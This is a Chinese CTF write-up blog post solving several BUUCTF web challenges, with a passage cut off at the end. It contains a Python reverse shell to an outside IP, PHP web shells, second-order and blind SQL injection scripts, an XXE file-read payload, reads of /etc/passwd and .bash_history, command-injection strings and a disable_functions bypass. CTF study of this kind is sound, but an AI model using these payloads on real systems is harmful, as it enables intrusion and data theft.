下面有个不带回显的 shell，在每次执行命令前都会把 flag 文件删除，那么就要反弹shell到自己的机器上
由于靶机不能访问外网，所以我们就要创一个小号来访问Basic上的靶机了，xshell连接，因为是python写的，所以用python反弹shell
`ifconfig`获取IP地址
获取靶机的ip地址填入即可，我的为174.1.99.230，端口自己设置一个，这里为7777，
`nc -lvp 7777`监听端口，多试了几次成功反弹
```powershell
/shell?c=python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('174.1.99.230',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```
![](https://img-blog.csdnimg.cn/20200325103415721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
借用赵师傅的话：反弹之后可以看见 flag 文件是被删除了，但由于之前程序打开了 flag 文件，在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。
![](https://img-blog.csdnimg.cn/20200325104603224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在`/proc/10/fd`找到了flag
![](https://img-blog.csdnimg.cn/20200325104749345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考链接：[2020 年 V&N 内部考核赛 WriteUp](https://www.zhaoj.in/read-6407.html)

## [RoarCTF 2019]Online Proxy
~~看wp后~~
查看源码看到客户端IP,猜测是把客户端的IP地址记录到数据库当中，经过尝试发现添加X-Forwarded-For可以修改ip，找到注入点
![](https://img-blog.csdnimg.cn/20200322172646217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
时间盲注即可，赵师傅则是将字符转为数字直接输出，效率高得多：
```python
#!/usr/bin/env python3

import requests

target = "http://node3.buuoj.cn:29745/"

def execute_sql(sql):
    print("[*]请求语句：" + sql)
    return_result = ""

    payload = "0'|length((" + sql + "))|'0"
    session = requests.session()
    r = session.get(target, headers={'X-Forwarded-For': payload})
    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
    start_pos = r.text.find("Last Ip: ")
    end_pos = r.text.find(" -->", start_pos)
    length = int(r.text[start_pos + 9: end_pos])
    print("[+]长度：" + str(length))

    for i in range(1, length + 1, 5):
        payload = "0'|conv(hex(substr((" + sql + ")," + str(i) + ",5)),16,10)|'0"

        r = session.get(target, headers={'X-Forwarded-For': payload}) # 将语句注入
        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})    # 查询上次IP时触发二次注入
        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})    # 再次查询得到结果
        start_pos = r.text.find("Last Ip: ")
        end_pos = r.text.find(" -->", start_pos)
        result = int(r.text[start_pos + 9: end_pos])
        return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8')

        print("[+]位置 " + str(i) + " 请求五位成功:" + bytes.fromhex(hex(result)[2:]).decode('utf-8'))

    return return_result


# 获取数据库
print("[+]获取成功：" + execute_sql("SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"))

# 获取数据库表
print("[+]获取成功：" + execute_sql("SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"))

# 获取数据库表
print("[+]获取成功：" + execute_sql("SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "))

# 获取表中内容
print("[+]获取成功：" + execute_sql("SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"))
```

![](https://img-blog.csdnimg.cn/20200322174315751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：
[[RoarCTF 2019]Online Proxy](https://www.cnblogs.com/20175211lyz/p/11719397.html)


## [GXYCTF2019]BabyUpload
过滤了htaccess，ph后缀，还限制了<?php，所以只能用：
```javascript
GIF89a
<script language="php">@eval($_POST['pass']);</script>
```
看了wp发现是可以上传htaccess的，或者使用竞争上传。
我这里还是使用htaccess，首先抓包修改Content-type类型为image/jpeg
![](https://img-blog.csdnimg.cn/20200331205743925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来上传xxx.jpg，发现路径是一样的，即可使用蚁剑连接
![](https://img-blog.csdnimg.cn/20200331210123997.png)
~~混了一题，以后可以试试竞争上传~~
## [网鼎杯 2018]Comment
首先进行目录扫描，发现了有git泄露
![](https://img-blog.csdnimg.cn/20200331211622346.png)
但发现文件不全，在控制台发现
![](https://img-blog.csdnimg.cn/20200331211713362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么就要修复git文件，使用大佬的脚本进行修复[王一航/GitHacker](https://github.com/wangyihang/githacker)
`python GitHack.py http://04955dbc-ce5a-46d7-8442-c5168d1078cf.node3.buuoj.cn/.git/`
进入新增的目录，`git log --reflog`，查看更改历史
![](https://img-blog.csdnimg.cn/20200401100234240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c`
![](https://img-blog.csdnimg.cn/2020040110041173.png)
得到代码如下：
```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```
题目首先给了账号密码提示，使用burpsuite爆破即可
![](https://img-blog.csdnimg.cn/20200401101734803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到密码为zhangwei666，然后进入发帖
![](https://img-blog.csdnimg.cn/20200401102116709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
$category = addslashes($_POST['category']);
$title = addslashes($_POST['title']);
$content = addslashes($_POST['content']);
```
在`do=write`的时候我们对categroy等变量进行了转义，每个引号、反斜杠等符号前都会加上一个反斜杠（数据库会自动清除反斜杠）。
```php
$category = mysql_fetch_array($result)['category'];
```
而在`do=comment`的时候会直接从数据库中对categroy进行调用，没有任何过滤，这就导致了二次注入。
发帖在categroy处填入`',content=database(),/*`
![](https://img-blog.csdnimg.cn/20200401103104915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
随后进入帖子，提交评论`*/#`
![](https://img-blog.csdnimg.cn/2020040110322171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
此时我们的sql语句变为：
```php
$sql = "insert into comment
            set category = '11',content=database(),/*',
                content = '*/#',
                bo_id = '$bo_id'";
```
__#只能注释一行，所以要用/**/__
然后利用load_file()函数读取文件
`',content=(select(load_file('/etc/passwd'))),/*`
![](https://img-blog.csdnimg.cn/20200401121834636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来读取文件,注意看到/home/www下以bash身份运行：`',content=(select(load_file("/home/www/.bash_history"))),/*`
![](https://img-blog.csdnimg.cn/202004011220218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来读取文件，但不能完全显示，使用16进制编码
`',content=(select hex(load_file("/tmp/html/.DS_Store"))),/*`
![](https://img-blog.csdnimg.cn/20200401122457748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
读取文件即可：
`	',content=(select hex(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*`
![](https://img-blog.csdnimg.cn/20200401122853802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：
[网鼎杯2018 comment](https://blog.csdn.net/weixin_44377940/article/details/104991188)
[[网鼎杯 2018]Comment](https://blog.csdn.net/weixin_43940853/article/details/105121265?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)
## [RoarCTF 2019]Simple Upload
题目给出了源码：
```php
 <?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
} 
```
又不会了，参考大佬wp，这里借鉴一下：
__Think PHP 上传默认路径：__
默认上传路径是/home/index/upload
**Think PHP upload()多文件上传：**
think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测，至于为什么上传两次1.txt，是为了获取php文件的后缀，因为这里的后缀命名方式运用了uniqid函数，它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。
**ThinkPHP 上传文件名爆破**
先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件
```python
import requests
url = 'http://d3ee0a32-992d-4d80-b55f-8099edb2bf6f.node3.buuoj.cn/index.php/Home/Index/upload'
file1 = {'file':open('1.txt','r')}
file2 = {'file[]':open('1.php','r')} #upload()不传参时即是批量上传所以用[]

r = requests.post(url,files = file1)
print r.text

r = requests.post(url,files = file2)
print r.text

r = requests.post(url, files = file1)
print r.text
```
![](https://img-blog.csdnimg.cn/20200401193320599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现后5位有变化，剩下就是爆破了，在1.php写下一句话木马，师傅脚本爆破：
```python
import requests
import time
str='0123456789abcdef'
for i in str:
    for j in str:
        for k in str:
            for o in str:
                for p in str:
                    url = "http://d3ee0a32-992d-4d80-b55f-8099edb2bf6f.node3.buuoj.cn/Public/Uploads/2020-04-01/5e847bce"+i+j+k+o+p+".php"
                    r = requests.get(url)
                    if r.status_code == 429:
                    	time.sleep(0.1)
                    	continue
                	elif r.status_code != 404:
                    	print(url)
                    	break
```
由于buuctf有限制，一秒访问10次，所以等了一大大大会，跑了一晚上，结果网断了，第二天继续跑，终于跑出来了qaq
![](https://img-blog.csdnimg.cn/20200402152317631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
![](https://img-blog.csdnimg.cn/20200402152344395.png)
参考大佬文章：
[RoarCTF2019 Writeup](https://paper.seebug.org/1059/#simple_upload)
[王叹之：[RoarCTF 2019]Simple Upload](https://www.cnblogs.com/wangtanzhi/p/12257246.html)
[[RoarCTF 2019]Simple Upload](https://blog.csdn.net/weixin_43940853/article/details/104040866)

## [NCTF2019]Fake XML cookbook
之前没怎么见过xee，参考了wp，学习一波
得到一个登陆页面，查看源代码得到关键信息
![](https://img-blog.csdnimg.cn/20200402172734955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```
XML漏洞：[从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887)
抓包使用payload
```javascript
<!DOCTYPE ANY [
    <!ENTITY test SYSTEM "file:///flag">
]>
<user><username>&test;</username><password>123</password></user>
```
![](https://img-blog.csdnimg.cn/20200402175908464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[[NCTF2019]Fake XML cookbook](https://www.cnblogs.com/wangtanzhi/p/12323562.html)

## [极客大挑战 2019]RCE ME
给出了源代码：
```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}
// ?>
```
控制长度小于40，不允许输入数字和字母的命令执行，我之前看过这一题，给了个getflag可以直接用，但这题没有，首先读取phpinfo()
```php
$_="`{{{"^"?<>/"; //_GET
${$_}[_](${$_}[__]); //$_GET[_]($_GET[__])
&_=assert&__=phpinfo()
```
发现很多函数被禁了
![](https://img-blog.csdnimg.cn/20200402191301666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后我们连上蚁剑
```php
$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=eval($_POST['a'])
```
在根目录看到flag和readflag
![](https://img-blog.csdnimg.cn/20200402192133942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现命令无法成功执行
![](https://img-blog.csdnimg.cn/20200402192255645.png)
接下来就是绕过disable_functions了，这里用师傅的脚本：[通过LD_PRELOA绕过disable_functions](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
在/var/tmp/目录存在上传权限，上传exp
![](https://img-blog.csdnimg.cn/20200410205654556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
使用payload：
```php
$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=include('/var/tmp/bypass_disablefunc.php')&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so
```
![](https://img-blog.csdnimg.cn/20200410210726593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)另外一个师傅的文章中构造了取反，学习一下：
`(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));`
![](https://img-blog.csdnimg.cn/20200819152428211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)




还可以上传：[PHP 7.0-7.4 disable_functions bypass](https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)
参考：
[bypass_disable_functions](http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/)
[[BUUOJ记录] [极客大挑战 2019]RCE ME](https://www.cnblogs.com/yesec/p/12483631.html)
[BUUCTF：[极客大挑战 2019]RCE ME](https://blog.csdn.net/mochu7777777/article/details/105136633)


## [WUSTCTF2020]朴实无华
看wp写一下武汉科技大学的题目，之前太菜没写出来
首先查看robots.txt
![](https://img-blog.csdnimg.cn/2020040814584645.png)
得到一个假的flag，后面是查看消息头得到fl4g.php，没想到
![](https://img-blog.csdnimg.cn/20200408150051710.png)
得到源码：
```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```
第一关绕过`intval()`函数，`intval()`可以处理的不仅仅是十进制，还有八进制、十六进制、科学计数法等
按照师傅的方式在本地运行了一下，发现不同版本结果是不一样的
![](https://img-blog.csdnimg.cn/20200408111100790.png)
![](https://img-blog.csdnimg.cn/20200408111111890.png)
![](https://img-blog.csdnimg.cn/20200408111310606.png)
那么就可以使用`num=1e5`绕过第一关了
第二关需要找一个0e+数字的字符串，然后md5它自身仍为0e开头。师傅脚本：
```python
import hashlib

for i in range(0,10**33):
    i = str(i)
    # i = i.zfill(33)
    num = '0e' + i
    md5 = hashlib.md5(num.encode()).hexdigest()
    if md5[0:2] == '0e' and md5[2:].isdigit():
        print('success str:{}  md5(str):{}'.format(num, md5))
        break
    else:
        print("trying {}".format(num))
```
得到`0e215962017，md5为0e291242476940776845150308577824`
第三关命令执行，但不能有空格，不能cat
首先`get_flag=ls`查看文件
![](https://img-blog.csdnimg.cn/20200408112646867.png)
我这里使用的是tac读取flag
```bash
get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```
![](https://img-blog.csdnimg.cn/20200408112800471.png)
```bash
师傅用的：
get_flag=more${IFS}`ls`
get_flag=ca\t$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```
参考：[Y1ng：武汉科技大学WUST-CTF 2020 Writeup](https://www.gem-love.com/ctf/2176.html#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E)
## [WUSTCTF2020]颜值成绩查询
这个题没想到，我怎么都是student number not exists.，最后看wp发现禁用了and，改为&&即可，空格使用/**/即可布尔盲注
![](https://img-blog.csdnimg.cn/20200408121758839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到第一个数字为c，爆出数据库为ctf，上Y1ng师傅的脚本：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#颖奇L'Amore www.gem-love.com #转载请勿删除水印
import requests
from urllib.parse import *
res = ''
alphabet = ['{','}', '@', '_',',','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']

for i in range(1,100):
	for char in alphabet:
		# information_schema,ctf
		# payload = "select/**/group_concat(schema_name)/**/from/**/information_schema.schemata"

		#flag,score
		# payload = "select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()" 

		#flag,value,id,name,score
		# payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()'
		
		#wctf2020{e@sy_sq1_and_y0u_sc0re_1t}
		payload = "select/**/group_concat(value)/**/from/**/flag"
		payload = quote(payload)
		url='http://101.200.53.102:10114/?stunum=2/(ascii(substr(({}),{},1))={})'.format(payload, i, ord(char))
		r = requests.get(url)
		# print(r.text[2473:2499])
		if '666' in r.text:
			res += char
			print(res)
			break
```
参考：[Y1ng：武汉科技大学WUST-CTF 2020 Writeup](https://www.gem-love.com/ctf/2176.html#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E)

查看官方wp发现大小写绕过或者双写绕过，直接联合查询即可。。。。~~还是水平不够，没试出来~~
```sql
-1/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()
```
![](https://img-blog.csdnimg.cn/20200408130207572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```sql
-1/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'
```
![](https://img-blog.csdnimg.cn/20200408130437973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`-1/**/uniounionn/**/select/**/1,2,value/**/from/**/flag`
![](https://img-blog.csdnimg.cn/20200408130614439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[WUST-CTF 2020 官方 Writeup](https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-14-solves)


## [MRCTF2020]Ez_bypass
给出了源码：
```php
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}
```
第一个数组绕过
`?gg[]=1&id[]=2`
或者md5强碰撞，直接上payload：~~第一时间想的md5强碰撞。。。。~~
```powershell
?gg=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&id=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```
成功过第一关，第二关更简单，弱类型即可
`passwd=1234567a`
![](https://img-blog.csdnimg.cn/20200408220338435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

## [MRCTF2020]PYWebsite
首先F12查看源码得到关键信息：
![](https://img-blog.csdnimg.cn/20200408220653475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
 function enc(code){
      hash = hex_md5(code);
      return hash;
    }
    function validate(){
      var code = document.getElementById("vcode").value;
      if (code != ""){
        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
          alert("您通过了验证！");
          window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
      }else{
        alert("请输入授权码");
      }
      
    }
```
不知道咋办，看wp发现直接读取`flag.php`
![](https://img-blog.csdnimg.cn/20200408221139716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现是查看IP，那么伪造`XFF：127.0.0.1`试试
![](https://img-blog.csdnimg.cn/20200408221339207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[Y1ng：MRCTF 2020 Writeup](https://www.gem-love.com/ctf/2184.html)

## [MRCTF2020]你传你🐎呢
测得禁止上传后缀带ph的，那么试试`.htaccess`
![](https://img-blog.csdnimg.cn/2020040822250154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
成功上传，那么上传xxx.jpg即可被解析为php
![](https://img-blog.csdnimg.cn/20200408222624418.png)
后面蚁剑即可得到flag

## [MRCTF2020]套娃
查看源码得到：
```php
<!--
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
